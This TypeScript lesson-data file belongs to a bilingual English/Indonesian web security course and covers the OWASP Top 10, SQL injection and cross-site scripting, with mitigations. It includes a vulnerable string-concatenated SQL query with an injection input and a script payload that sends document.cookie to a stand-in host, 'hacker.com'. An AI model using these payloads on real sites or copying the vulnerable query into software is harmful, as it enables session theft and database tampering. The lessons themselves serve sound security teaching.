import type { LessonData } from '../../index';

const lessons: LessonData[] = [
  {
    id: 'security-m1-l1',
    courseId: 'security',
    moduleId: 'security-m1',
    title: 'Introduction to OWASP Top 10',
    titleId: 'Pengenalan OWASP Top 10',
    xp: 30,
    theory: [
      {
        type: 'text',
        content: 'OWASP (Open Worldwide Application Security Project) is a nonprofit foundation that works to improve the security of software. They publish the "OWASP Top 10", a standard awareness document representing the most critical security risks to web applications.',
        contentId: 'OWASP (Open Worldwide Application Security Project) adalah yayasan nirlaba yang bekerja untuk meningkatkan keamanan perangkat lunak. Mereka menerbitkan "OWASP Top 10", sebuah dokumen standar yang mewakili risiko keamanan paling kritis untuk aplikasi web.',
      },
      {
        type: 'text',
        content: 'Every developer should understand these top vulnerabilities before deploying applications to production to prevent devastating data breaches.',
        contentId: 'Setiap developer harus memahami kerentanan utama ini sebelum merilis aplikasi ke publik (production) untuk mencegah kebocoran data yang menghancurkan.',
      },
    ],
  },
  {
    id: 'security-m1-l2',
    courseId: 'security',
    moduleId: 'security-m1',
    title: 'SQL Injection (SQLi)',
    titleId: 'SQL Injection (SQLi)',
    xp: 30,
    theory: [
      {
        type: 'text',
        content: 'SQL Injection occurs when user-supplied data is included directly in a SQL query without validation. An attacker can manipulate the query to view, modify, or delete database records.',
        contentId: 'SQL Injection terjadi ketika data yang diberikan pengguna dimasukkan langsung ke dalam kueri SQL tanpa validasi. Penyerang dapat memanipulasi kueri untuk melihat, memodifikasi, atau menghapus catatan database.',
      },
      {
        type: 'code',
        language: 'javascript',
        content: '// ❌ VULNERABLE CODE (Never do this!)\nconst query = "SELECT * FROM users WHERE username = \'" + userInput + "\'";\n// If userInput is "\' OR 1=1 --", the query becomes:\n// SELECT * FROM users WHERE username = \'\' OR 1=1 --\'',
      },
      {
        type: 'text',
        content: 'To prevent SQLi, ALWAYS use Prepared Statements (Parameterized Queries). When you use parameters, the database treats the user input strictly as data, not as executable code.',
        contentId: 'Untuk mencegah SQLi, SELALU gunakan Prepared Statements (Parameterized Queries). Saat Anda menggunakan parameter, database akan memperlakukan input pengguna secara ketat sebagai data, bukan sebagai kode yang dapat dieksekusi.',
      },
    ],
  },
  {
    id: 'security-m1-l3',
    courseId: 'security',
    moduleId: 'security-m1',
    title: 'Cross-Site Scripting (XSS)',
    titleId: 'Cross-Site Scripting (XSS)',
    xp: 30,
    theory: [
      {
        type: 'text',
        content: 'Cross-Site Scripting (XSS) attacks occur when an attacker injects malicious JavaScript into the web pages viewed by other users. This script can steal cookies, session tokens, or perform actions on behalf of the user.',
        contentId: 'Serangan Cross-Site Scripting (XSS) terjadi ketika penyerang menyuntikkan JavaScript berbahaya ke halaman web yang dilihat oleh pengguna lain. Skrip ini dapat mencuri cookie, token sesi, atau melakukan tindakan atas nama pengguna.',
      },
      {
        type: 'code',
        language: 'html',
        content: '<!-- Example of an XSS attack payload entered in a comment box -->\n<script>fetch("http://hacker.com/steal?cookie=" + document.cookie)</script>',
      },
      {
        type: 'text',
        content: 'Mitigation: Always "escape" or encode user output before rendering it in HTML. Modern frameworks like React and Vue automatically escape output by default, protecting you from XSS.',
        contentId: 'Mitigasi: Selalu lakukan "escape" atau encode pada output pengguna sebelum menampilkannya di HTML. Framework modern seperti React dan Vue secara otomatis melakukan escape pada output secara default, melindungi Anda dari XSS.',
      },
    ],
  },
];

export default lessons;
